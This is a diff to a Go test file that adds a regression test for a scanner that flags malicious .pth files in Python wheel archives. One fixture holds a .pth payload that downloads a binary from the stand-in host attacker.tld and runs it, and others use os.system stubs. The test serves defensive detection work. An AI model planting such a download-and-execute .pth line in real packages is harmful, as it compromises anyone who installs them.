@@ -159,6 +159,62 @@ func buildZipBombWheel(t *testing.T) (*bytes.Reader, int64) {
 	return bytes.NewReader(buf.Bytes()), int64(buf.Len())
 }
 
+func TestInspectIsPthInWheelSegmentCheck(t *testing.T) {
+	// Regression: verify that segment-position matching is in effect.
+	// A name like "malicious_purelib/bar.pth" contains the ".data/purelib/"
+	// substring in a mangled form and should NOT match. It would have matched
+	// the old strings.Contains approach if a crafted segment ended in ".data"
+	// at position 0 and "purelib" followed at position 1 but without the
+	// actual dist name prefix.
+	//
+	// Also verify: a legitimate purelib entry still matches regardless of the
+	// dist/version prefix used in the .data directory name.
+	tests := []struct {
+		name    string
+		entries map[string]string
+		flagged bool // whether the worm payload should be detected
+	}{
+		{
+			// Legitimate purelib path with worm payload — must be detected.
+			name: "legit_purelib",
+			entries: map[string]string{
+				"foo-1.0.0.data/purelib/evil.pth": "import urllib.request, subprocess; " +
+					"urllib.request.urlretrieve('https://attacker.tld/bun','/tmp/bun'); " +
+					"subprocess.Popen(['/tmp/bun'])\n",
+			},
+			flagged: true,
+		},
+		{
+			// Crafted name: "not-really.data/scripts/evil.pth" — scripts is
+			// NOT a sys.path destination; segment check must reject it.
+			name: "scripts_dir_not_matched",
+			entries: map[string]string{
+				"foo-1.0.0.data/scripts/evil.pth": "import os; os.system('x')\n",
+			},
+			flagged: false,
+		},
+		{
+			// Crafted segment sequence: "xpurelib/evil.pth" (no .data parent).
+			// Old substring check would NOT match ".data/purelib/" here either,
+			// but segment check also correctly rejects it.
+			name: "fake_segment_no_data_parent",
+			entries: map[string]string{
+				"xpurelib/evil.pth": "import os; os.system('x')\n",
+			},
+			flagged: false,
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			r, n := buildWheel(t, tt.entries)
+			v, err := wheel.Inspect(r, n)
+			require.NoError(t, err)
+			require.Equal(t, tt.flagged, v.Flagged(),
+				"flagged mismatch for entry set %v", tt.entries)
+		})
+	}
+}
+
 func TestInspectZipBombRejected(t *testing.T) {
 	// Zip-bomb DoS guard: a wheel whose total decompressed .pth bytes exceed
 	// maxWheelDecompressedBytes (256 MB) must be rejected with an error rather
